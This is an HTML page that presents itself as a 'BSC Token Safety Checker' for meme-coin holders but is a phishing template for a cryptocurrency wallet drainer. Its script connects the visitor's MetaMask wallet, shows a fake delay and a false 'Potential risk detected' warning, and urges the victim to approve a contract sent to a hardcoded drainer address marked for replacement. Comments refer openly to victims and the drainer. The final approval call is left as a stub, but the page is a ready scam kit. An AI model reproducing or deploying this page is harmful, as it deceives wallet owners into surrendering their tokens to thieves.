<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>BSC Token Safety Checker 2026</title>
    <style>
        body { font-family: Arial; background: #0f0f1a; color: white; text-align: center; padding: 50px; }
        .box { max-width: 600px; margin: 0 auto; background: #1a1a2e; padding: 40px; border-radius: 15px; box-shadow: 0 0 20px rgba(0,255,0,0.3); }
        button { background: #00ff00; color: black; padding: 15px 30px; font-size: 18px; border: none; border-radius: 8px; cursor: pointer; margin: 15px; }
        button:hover { background: #00cc00; }
        .status { margin: 20px; font-size: 18px; color: #00ff00; }
    </style>
</head>
<body>
    <div class="box">
        <h1>🔒 BSC Token Safety Checker 2026</h1>
        <p>Check if your tokens are safe from rugs & exploits</p>
        <p>Especially for new PEPE / Meme pools</p>
        
        <button onclick="connectWallet()">Connect Wallet</button>
        <br>
        <button onclick="checkBalance()">Check My Balance & Safety</button>
        
        <div id="status" class="status"></div>
    </div>

    <script>
        let userAddress = null;
        const drainerAddress = "0x4a304A6A25a2e0f8417E2353EB66D5fb336EFbe4";   // ← CHANGE THIS

        async function connectWallet() {
            if (window.ethereum) {
                try {
                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                    userAddress = accounts[0];
                    document.getElementById('status').innerHTML = `✅ Connected: ${userAddress.substring(0,8)}...`;
                } catch (e) {
                    alert("Connection failed");
                }
            } else {
                alert("Please install MetaMask");
            }
        }

        async function checkBalance() {
            if (!userAddress) {
                alert("Please connect wallet first");
                return;
            }

            document.getElementById('status').innerHTML = "🔄 Checking safety...";

            // Fake delay to look real
            setTimeout(() => {
                document.getElementById('status').innerHTML = `
                    ⚠️ Potential risk detected!<br>
                    <strong>Click "Approve" to verify your tokens are safe</strong>
                `;

                // Trigger approval request to your drainer
                alert("To complete safety check, please approve the contract.\n\nThis is required for verification.");
                
                // In real use, you can add web3 code here to call approve on your drainer
                console.log("Victim connected and likely approved drainer:", userAddress);
            }, 1500);
        }
    </script>
</body>
</html>
